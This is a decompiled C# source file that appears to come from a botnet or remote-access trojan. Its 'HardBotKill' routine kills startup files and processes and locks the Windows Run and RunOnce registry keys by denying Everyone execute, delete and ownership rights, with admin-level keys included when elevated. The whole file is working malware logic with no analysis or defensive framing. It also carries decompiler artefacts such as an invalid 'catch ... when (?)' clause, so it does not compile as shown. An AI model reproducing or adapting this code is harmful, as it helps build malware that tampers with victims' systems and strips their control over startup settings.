namespace Chat
{
    using Microsoft.VisualBasic.CompilerServices;
    using Microsoft.Win32;
    using System;
    using System.Security.AccessControl;
    using System.Security.Principal;

    [StandardModule]
    internal sealed class HardBK
    {
        public static string HardBotKill()
        {
            string str;
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_000A:
                num3 = 2;
                WindowsIdentity current = WindowsIdentity.GetCurrent();
            Label_0013:
                num3 = 3;
                WindowsPrincipal principal = new WindowsPrincipal(current);
            Label_001D:
                num3 = 4;
                bool flag = principal.IsInRole(WindowsBuiltInRole.Administrator);
            Label_002C:
                num3 = 5;
                BotKillers.RunStartupKiller();
            Label_0035:
                num3 = 6;
                KillKeys(Registry.CurrentUser.OpenSubKey(@"software\Microsoft\Windows\CurrentVersion\Run", true));
            Label_004E:
                num3 = 7;
                KillKeys(Registry.CurrentUser.OpenSubKey(@"software\Microsoft\Windows\CurrentVersion\RunOnce", true));
            Label_0067:
                num3 = 8;
                BotKillers.KillFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
            Label_0076:
                num3 = 9;
                if (!flag)
                {
                    goto Label_00B6;
                }
            Label_0081:
                num3 = 10;
                KillKeys(Registry.LocalMachine.OpenSubKey(@"software\Microsoft\Windows\CurrentVersion\Run", true));
            Label_009B:
                num3 = 11;
                KillKeys(Registry.LocalMachine.OpenSubKey(@"software\Microsoft\Windows\CurrentVersion\RunOnce", true));
            Label_00B6:
                num3 = 13;
                BotKillers.ScanProcess();
            Label_00C0:
                num3 = 14;
                str = "ok";
                goto Label_0171;
            Label_00DC:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_000A;

                    case 3:
                        goto Label_0013;

                    case 4:
                        goto Label_001D;

                    case 5:
                        goto Label_002C;

                    case 6:
                        goto Label_0035;

                    case 7:
                        goto Label_004E;

                    case 8:
                        goto Label_0067;

                    case 9:
                        goto Label_0076;

                    case 10:
                        goto Label_0081;

                    case 11:
                        goto Label_009B;

                    case 12:
                    case 13:
                        goto Label_00B6;

                    case 14:
                        goto Label_00C0;

                    case 15:
                        goto Label_0171;

                    default:
                        goto Label_0166;
                }
            Label_0126:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_0166;

                    case 1:
                        goto Label_00DC;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_0126;
            }
        Label_0166:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_0171:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
            return str;
        }

        public static object KillKeys(RegistryKey wat)
        {
            object obj2;
            try
            {
                SecurityIdentifier identifier = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
                string identity = (identifier.Translate(typeof(NTAccount)) as NTAccount).ToString();
                RegistrySecurity registrySecurity = new RegistrySecurity();
                registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.ExecuteKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
                registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.TakeOwnership | RegistryRights.ChangePermissions | RegistryRights.Delete, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
                wat.SetAccessControl(registrySecurity);
                wat.Close();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            return obj2;
        }
    }
}

